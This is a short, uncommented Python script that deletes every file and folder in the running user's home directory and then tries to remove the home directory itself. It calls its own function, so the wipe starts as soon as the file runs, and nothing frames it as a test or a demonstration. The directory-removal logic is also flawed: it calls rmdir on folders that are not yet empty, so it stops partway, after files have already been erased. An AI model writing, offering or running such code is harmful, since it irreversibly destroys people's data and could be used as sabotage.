import os

def delete_all_files_in_home():
  home = os.path.expanduser('~')
  os.chdir(home)

  for root, dirs, files in os.walk('.'):
    for name in files:
      os.remove(os.path.join(root, name))
    for name in dirs:
      os.rmdir(os.path.join(root, name))

  os.rmdir(home)

delete_all_files_in_home()

